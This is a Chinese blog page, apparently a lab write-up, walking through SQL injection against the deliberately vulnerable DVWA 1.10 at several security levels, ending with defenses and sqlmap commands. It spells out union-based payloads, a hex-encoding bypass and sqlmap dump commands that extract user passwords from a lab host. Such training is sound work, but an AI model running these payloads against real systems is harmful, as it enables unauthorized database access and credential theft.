@@ -1,0 +1,1552 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-bounce.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32x32.ico?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="keywords" content="DVWA1.10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA1.10之SQL注入">
+<meta property="og:url" content="http://yoursite.com/2019/05/12/DVWA之SQL注入/index.html">
+<meta property="og:site_name" content="LoongEyes">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/web_anquan/web_anquan2.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/1.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/4.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/2.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/3.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/5.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/6.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/7.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/8.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/9.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/10.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/11.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/12.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/13.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/14.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/15.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/16.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/17.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/18.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/20.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/19.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/21.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/22.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/23.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/24.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/25.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/26.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/27.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/28.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/29.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/30.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/31.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/32.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/33.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/34.png">
+<meta property="og:image" content="http://yoursite.com/images/baji/dvwa/SQL%20Injection/35.png">
+<meta property="og:updated_time" content="2020-02-24T04:20:31.134Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DVWA1.10之SQL注入">
+<meta name="twitter:image" content="http://yoursite.com/images/web_anquan/web_anquan2.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/12/DVWA之SQL注入/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>DVWA1.10之SQL注入 | LoongEyes</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LoongEyes</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/12/DVWA之SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LoongEyes">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LoongEyes">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DVWA1.10之SQL注入
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-12 21:30:00" itemprop="dateCreated datePublished" datetime="2019-05-12T21:30:00+08:00">2019-05-12</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-02-24 12:20:31" itemprop="dateModified" datetime="2020-02-24T12:20:31+08:00">2020-02-24</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/靶机/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<a id="more"></a>
+<h1 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h1><p><code>SQL Injection</code>，即<code>SQL</code>注入，是指攻击者通过注入恶意的<code>SQL</code>命令，破坏<code>SQL</code>查询语句的结构，从而达到执行恶意<code>SQL</code>语句的目的。<code>SQL</code>注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，<code>SQL</code>注入仍是现在最常见的<code>Web</code>漏洞之一</p>
+<p><img src="/images/web_anquan/web_anquan2.png" alt="1.png"></p>
+<hr>
+<h1 id="手工注入思路"><a href="#手工注入思路" class="headerlink" title="手工注入思路"></a>手工注入思路</h1><ol>
+<li><p>判断是否存在注入，注入是字符型还是数字型</p>
+<p> 当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入</p>
+<p> 当输入的参数为字符串时，如果存在注入漏洞，可以认为是字符型注入</p>
+<p>  字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的</p>
+</li>
+<li><p>猜解<code>SQL</code>查询语句中的字段数</p>
+</li>
+<li><p>获取当前数据库</p>
+</li>
+<li><p>获取数据库中的表</p>
+</li>
+<li><p>获取表中的列名(字段名)</p>
+</li>
+<li><p>获取数据记录</p>
+</li>
+</ol>
+<hr>
+<h1 id="LOW级别漏洞利用"><a href="#LOW级别漏洞利用" class="headerlink" title="LOW级别漏洞利用"></a>LOW级别漏洞利用</h1><h2 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><ol>
+<li><p>输入1，查询成功</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/1.png" alt="1.png"></p>
+</li>
+<li><p>输入<code>&#39;</code>，出现报错</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/4.png" alt="4.png"></p>
+<p> 显示数据库为<code>MariaDB</code>，即<code>mysql</code></p>
+</li>
+<li><p>输入<code>1&#39; and &#39;1&#39;=&#39;1</code>，返回正常</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/2.png" alt="2.png"></p>
+</li>
+<li><p>输入<code>1&#39; and &#39;1&#39;=&#39;2</code>，无返回</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/3.png" alt="3.png"></p>
+</li>
+</ol>
+<p>可进行逻辑运算，且出现数据库报错，此为基于报错的<code>SQL</code>注入</p>
+<p>需使用<code>&#39;</code>引号来进行闭合，为字符型<code>SQL</code>注入</p>
+<p>可猜出查询语句为<code>select [字段1,字段2,...] from 表 where 字段=&#39;&#39;;</code></p>
+<h2 id="猜解SQL查询语句中的字段数"><a href="#猜解SQL查询语句中的字段数" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h2><ol>
+<li><p>输入<code>1&#39; order by 1--</code>，返回正常</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/5.png" alt="5.png"></p>
+</li>
+<li><p>输入<code>1&#39; order by 2--</code>，返回正常</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/6.png" alt="6.png"></p>
+</li>
+<li><p>输入<code>1&#39; order by 3--</code>，出现报错</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/7.png" alt="7.png"></p>
+</li>
+</ol>
+<p>说明执行的<code>SQL</code>查询语句中只有两个字段(即查询一个数据表中的两列)，即这里的<code>First name</code>、<code>Surname</code></p>
+<p>可猜出查询语句为<code>select 字段1,字段2 from 表 where 字段=&#39;&#39;;</code></p>
+<h2 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h2><p>输入<code>1&#39; union select 1,database()--</code></p>
+<p><img src="/images/baji/dvwa/SQL Injection/8.png" alt="8.png"></p>
+<p>说明当前查询的数据库为<code>dvwa</code></p>
+<h2 id="获取dvwa数据库中的表"><a href="#获取dvwa数据库中的表" class="headerlink" title="获取dvwa数据库中的表"></a>获取dvwa数据库中的表</h2><p><code>information_schema</code>数据库是<code>MySQL</code>自带的，它提供了访问数据库元数据的方式</p>
+<p>其中保存着关于<code>MySQL</code>服务器所维护的所有其他数据库的信息。如：数据库名，数据库的表，列的数据类型与访问权限等</p>
+<p><code>information_schema</code>数据库的<code>table</code>表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个数据库，表类型，表引擎，创建时间等信息</p>
+<p>输入<code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;dvwa&#39;--</code></p>
+<p><img src="/images/baji/dvwa/SQL Injection/9.png" alt="9.png"></p>
+<p>说明<code>dvwa</code>数据库中存在<code>guestbook</code>，<code>users</code>两张表</p>
+<p>可猜出查询语句为<code>select 字段1,字段2 from users where 字段=&#39;&#39;;</code></p>
+<h2 id="获取dvwa库users表中的列名"><a href="#获取dvwa库users表中的列名" class="headerlink" title="获取dvwa库users表中的列名"></a>获取dvwa库users表中的列名</h2><p><code>information_schema</code>数据库的<code>columns</code>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息</p>
+<p>输入<code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--</code></p>
+<p><img src="/images/baji/dvwa/SQL Injection/10.png" alt="10.png"></p>
+<p>发现<code>dvwa</code>库<code>users</code>表中有8列(即字段)，分别是<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>user</code>,<code>password</code>,<code>avatar</code>,<code>last_login</code>,<code>failed_login</code></p>
+<p>可猜出查询语句为<code>select first_name,last_name from users where user_id=&#39;&#39;;</code></p>
+<h2 id="获取数据记录"><a href="#获取数据记录" class="headerlink" title="获取数据记录"></a>获取数据记录</h2><p>输入<code>1&#39; union select group_concat(user_id,first_name,last_name),group_concat(password) from users--</code></p>
+<p><img src="/images/baji/dvwa/SQL Injection/11.png" alt="11.png"></p>
+<p>则得到了<code>dvwa</code>库中<code>users</code>表中所有用户的<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>password</code>的数据</p>
+<hr>
+<h1 id="Medium级别漏洞利用"><a href="#Medium级别漏洞利用" class="headerlink" title="Medium级别漏洞利用"></a>Medium级别漏洞利用</h1><h2 id="判断是否存在注入，注入是字符型还是数字型-1"><a href="#判断是否存在注入，注入是字符型还是数字型-1" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><p>前端使用下拉框限制输入参数</p>
+<p><img src="/images/baji/dvwa/SQL Injection/12.png" alt="12.png"></p>
+<p>可以使用<code>BurpSuite</code>进行抓包修改输入参数</p>
+<ol>
+<li><p>改包，使输入为<code>&#39;</code></p>
+<p> <img src="/images/baji/dvwa/SQL Injection/13.png" alt="13.png"></p>
+<p> 报错</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/14.png" alt="14.png"></p>
+<p> 发现对<code>&#39;</code>进行了转义处理</p>
+</li>
+<li><p>改包，使输入为<code>1&#39; and &#39;1&#39;=&#39;1</code></p>
+<p> <img src="/images/baji/dvwa/SQL Injection/15.png" alt="15.png"></p>
+<p> 报错</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/16.png" alt="16.png"></p>
+</li>
+<li><p>改包，使输入为<code>1 and 1=1</code></p>
+<p> <img src="/images/baji/dvwa/SQL Injection/17.png" alt="17.png"></p>
+<p> 正常返回</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/18.png" alt="18.png"></p>
+</li>
+<li><p>改包，使输入为<code>1 and 1=2</code></p>
+<p> <img src="/images/baji/dvwa/SQL Injection/20.png" alt="20.png"></p>
+<p> 无返回</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/19.png" alt="19.png"></p>
+</li>
+</ol>
+<p>可进行逻辑运算，且出现数据库报错，此为基于报错的<code>SQL</code>注入，但对<code>&#39;</code>等特殊符号进行转义</p>
+<p>无需使用<code>&#39;</code>引号来进行闭合，为数字型<code>SQL</code>注入</p>
+<p>由于是数字型注入，服务器端对特殊字符的转义就形同虚设了，因为数字型注入并不需要借助引号</p>
+<p>可猜出查询语句为<code>select [字段1,字段2,...] from 表 where 字段= ;</code></p>
+<h2 id="猜解SQL查询语句中的字段数-1"><a href="#猜解SQL查询语句中的字段数-1" class="headerlink" title="猜解SQL查询语句中的字段数"></a>猜解SQL查询语句中的字段数</h2><ol>
+<li><p>改包，使输入为<code>1 order by 2--</code></p>
+<p> <img src="/images/baji/dvwa/SQL Injection/21.png" alt="21.png"></p>
+</li>
+<li><p>改包，使输入为<code>1 order by 3--</code></p>
+<p> 报错</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/22.png" alt="22.png"></p>
+</li>
+</ol>
+<p>说明执行的<code>SQL</code>查询语句中只有两个字段(即查询一个数据表中的两列)，即这里的<code>First name</code>、<code>Surname</code></p>
+<p>可猜出查询语句为<code>select 字段1,字段2 from 表 where 字段= ;</code></p>
+<h2 id="获取当前数据库-1"><a href="#获取当前数据库-1" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h2><p>改包，使输入为<code>1 union select 1,database()--</code></p>
+<p><img src="/images/baji/dvwa/SQL Injection/23.png" alt="23.png"></p>
+<p>说明当前的数据库为<code>dvwa</code></p>
+<h2 id="获取dvwa数据库中的表-1"><a href="#获取dvwa数据库中的表-1" class="headerlink" title="获取dvwa数据库中的表"></a>获取dvwa数据库中的表</h2><p>改包，使输入为<code>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--</code></p>
+<p><img src="/images/baji/dvwa/SQL Injection/24.png" alt="24.png"></p>
+<p>说明<code>dvwa</code>数据库中存在<code>guestbook</code>，<code>users</code>两张表</p>
+<p>可猜出查询语句为<code>select 字段1,字段2 from users where 字段= ;</code></p>
+<h2 id="获取dvwa库users表中的列名-1"><a href="#获取dvwa库users表中的列名-1" class="headerlink" title="获取dvwa库users表中的列名"></a>获取dvwa库users表中的列名</h2><ol>
+<li><p>改包，使输入为<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--</code></p>
+<p> 查询失败</p>
+<p> <img src="/images/baji/dvwa/SQL Injection/25.png" alt="25.png"></p>
+<p> 因对<code>&#39;</code>等特殊字符进行了转义，所以查询失败</p>
+</li>
+<li><p>使用十六进制对过滤进行绕过</p>
+<p> 使用<code>BurpSuite</code>将<code>users</code>转换为十六进制<code>0x7573657273</code></p>
+<p> <img src="/images/baji/dvwa/SQL Injection/26.png" alt="26.png"></p>
+<p> 改包，使输入为<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--</code></p>
+<p> <img src="/images/baji/dvwa/SQL Injection/27.png" alt="27.png"></p>
+</li>
+</ol>
+<p>发现<code>dvwa</code>库<code>users</code>表中有8列(即字段)，分别是<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>user</code>,<code>password</code>,<code>avatar</code>,<code>last_login</code>,<code>failed_login</code></p>
+<p>可猜出查询语句为<code>select first_name,last_name from users where user_id= ;</code></p>
+<h2 id="获取数据记录-1"><a href="#获取数据记录-1" class="headerlink" title="获取数据记录"></a>获取数据记录</h2><p>改包，使输入为<code>1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users--</code></p>
+<p><img src="/images/baji/dvwa/SQL Injection/28.png" alt="28.png"></p>
+<p>则得到了<code>dvwa</code>库中<code>users</code>表中所有用户的<code>user_id</code>,<code>first_name</code>,<code>last_name</code>,<code>password</code>的数据</p>
+<hr>
+<h1 id="High级别漏洞利用"><a href="#High级别漏洞利用" class="headerlink" title="High级别漏洞利用"></a>High级别漏洞利用</h1><h2 id="判断是否存在注入，注入是字符型还是数字型-2"><a href="#判断是否存在注入，注入是字符型还是数字型-2" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h2><p><code>High</code>级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的<code>sqlmap</code>注入，因为<code>sqlmap</code>在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入</p>
+<p><img src="/images/baji/dvwa/SQL Injection/29.png" alt="29.png"></p>
+<p><img src="/images/baji/dvwa/SQL Injection/30.png" alt="30.png"></p>
+<p><code>High</code>级别在<code>low</code>级别的基础上，在<code>SQL</code>查询语句后加入<code>LIMIT 1</code>，用于希望以此控制只输出一个结果，可通过<code>--</code>注释符来进行注释</p>
+<p><code>High</code>级别对数据库报错进行了处理，显示统一的报错信息</p>
+<p>与<code>low</code>级别的注入基本相似</p>
+<hr>
+<h1 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h1><p><code>Impossible</code>级别的代码采用了<code>PDO</code>技术，划清了代码与数据的界限，有效防御<code>SQL</code>注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，<code>Anti-CSRFtoken</code>机制的加入了进一步提高了安全性</p>
+<p><code>PHP</code>数据对象（<code>PDO</code>）扩展为<code>PHP</code>访问数据库定义了一个轻量级的一致接口</p>
+<p><code>PDO</code>提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据</p>
+<hr>
+<h1 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h1><ol>
+<li><p>所有的查询语句都使用数据库提供的参数化查询接口</p>
+</li>
+<li><p>对进入数据库的特殊字符(<code>&#39;</code>，<code>&quot;</code>，<code>select</code>，<code>union</code>，<code>--</code>，<code>#</code>，<code>order by</code>)进行转义处理，或编码转换</p>
+</li>
+<li><p>严格限制数据类型</p>
+</li>
+<li><p>严格限制参数长度</p>
+</li>
+<li><p>网站每个数据层的编码统一，建议<code>UTF-8</code></p>
+</li>
+<li><p>严格限制网站用户的数据库的操作权限，最小权限原则</p>
+</li>
+<li><p>统一错误信息提示</p>
+</li>
+<li><p>使用预编译语句</p>
+</li>
+<li><p>使用存储过程</p>
+</li>
+<li><p>白名单验证输入</p>
+</li>
+</ol>
+<hr>
+<h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><h2 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; --dbs --batch</span><br></pre></td></tr></table></figure>
+<p><img src="/images/baji/dvwa/SQL Injection/31.png" alt="31.png"></p>
+<h2 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa --tables --batch</span><br></pre></td></tr></table></figure>
+<p><img src="/images/baji/dvwa/SQL Injection/32.png" alt="32.png"></p>
+<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa -T users --column --batch</span><br></pre></td></tr></table></figure>
+<p><img src="/images/baji/dvwa/SQL Injection/33.png" alt="33.png"></p>
+<h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://172.16.12.85/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=cc7cccd8ffe7bb1d03328b0dace970db; security=low&quot; -D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure>
+<p><img src="/images/baji/dvwa/SQL Injection/34.png" alt="34.png"></p>
+<p><img src="/images/baji/dvwa/SQL Injection/35.png" alt="35.png"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/DVWA1-10/" <i class="fa fa-tag"></i> DVWA1.10</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/11/kali下安装nessus/" rel="next" title="kali下安装nessus">
+                <i class="fa fa-chevron-left"></i> kali下安装nessus
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/13/DVWA1-10之XSS/" rel="prev" title="DVWA1.10之XSS">
+                DVWA1.10之XSS <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  
+  <div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">---------------The  End---------------</div>
+    
+</div>
+	
+  </div>
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
